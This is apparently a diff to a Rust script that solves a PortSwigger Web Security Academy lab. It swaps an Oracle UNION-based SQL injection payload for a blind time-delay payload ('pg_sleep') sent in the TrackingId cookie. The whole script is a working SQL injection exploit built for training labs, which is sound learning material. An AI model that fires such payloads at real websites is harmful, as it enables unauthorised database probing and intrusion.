@@ -1,15 +1,15 @@
-/*******************************************************************************
+/***************************************************************************************
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
-* Date: 15/9/2023
+* Date: 23/9/2023
 *
-* Lab: SQL injection attack, querying the database type and version on Oracle
+* Lab: Blind SQL injection with time delays
 *
-* Steps: 1. Inject payload into 'category' query parameter
-*        2. Retrieve database banner in the response
+* Steps: 1. Inject payload into 'TrackingId' cookie to cause a 10 seconds delay
+*        2. Wait for the response
 *
-********************************************************************************/
+****************************************************************************************/
 #![allow(unused)]
 /***********
 * Imports
@@ -31,31 +31,37 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a0a0041033073c5810ea2a600b4006c.web-security-academy.net";
+    let url = "https://0a30002e035422da80b4e42c000f0043.web-security-academy.net";
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    print!(
-        "{}",
-        "1. Injecting payload into 'category' query parameter.. ".white(),
+    println!(
+        "{} {}",
+        "[#] Injection point:".blue(),
+        "TrackingId".yellow(),
     );
+
+    // payload to make a 10 seconds delay
+    let payload = "' || pg_sleep(10)-- -";
+
+    print!(
+        "\n{}{}",
+        "1. Injecting payload to cause a 10 seconds delay.. ".white(),
+        "OK".green()
+    );
+    print!("\n{}", "2. Waiting for the response.. ".white());
     io::stdout().flush();
-    // the payload to inject in the query parameter
-    let payload = "' UNION SELECT banner, null FROM v$version-- -";
     // fetch the page with the injected payload
-    let inject = client
-        .get(format!("{url}/filter?category=Gifts{payload}"))
+    let make_delay = client
+        .get(format!("{url}/filter?category=Pets"))
+        .header("Cookie", format!("TrackingId={payload}"))
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to fetch the page with the injected payload".red()
+            "[!] Failed to make a delay with the injected payload".red()
         ));
     println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "2. Retrieving database banner in the response..".white(),
-        "OK".green()
-    );
+
     println!(
         "{} {}",
         "[#] Check your browser, it should be marked now as"
@@ -72,7 +78,7 @@ fn main() {
 fn build_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
-        .connect_timeout(Duration::from_secs(5))
+        .connect_timeout(Duration::from_secs(20))
         .build()
         .unwrap()
 }
